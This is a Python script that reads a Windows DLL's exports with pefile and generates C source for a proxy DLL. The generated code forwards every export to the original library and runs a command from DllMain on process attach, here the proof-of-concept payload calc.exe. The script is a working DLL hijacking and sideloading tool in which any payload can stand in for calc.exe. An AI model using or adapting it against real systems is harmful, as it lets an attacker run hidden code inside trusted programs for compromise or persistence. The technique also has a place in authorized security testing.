#!/usr/bin/env python3
 
import pefile
import sys
import os.path
from pathlib import Path
 
if len(sys.argv) < 2:
    print(f"Usage: python {sys.argv[0]} <path_to_dll>")
    sys.exit(1)

target_dll = sys.argv[1]

target_path = Path(target_dll)
target_dll_no_extension = target_path.stem 

dll = pefile.PE(str(target_path))
dll_basename = target_path.stem

print("#pragma once")

for export in dll.DIRECTORY_ENTRY_EXPORT.symbols:
    if export.name:
        func_name = export.name.decode()
        print(f'#pragma comment(linker,"/export:{func_name}={target_dll_no_extension.replace("\\", "\\\\")}.{func_name},@{export.ordinal}")')

print()
print('#include "windows.h"')
print(f'HMODULE hModule = LoadLibrary(L"{str(target_path).replace("\\", "\\\\")}");')
print("""
BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        system("calc.exe");
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

""")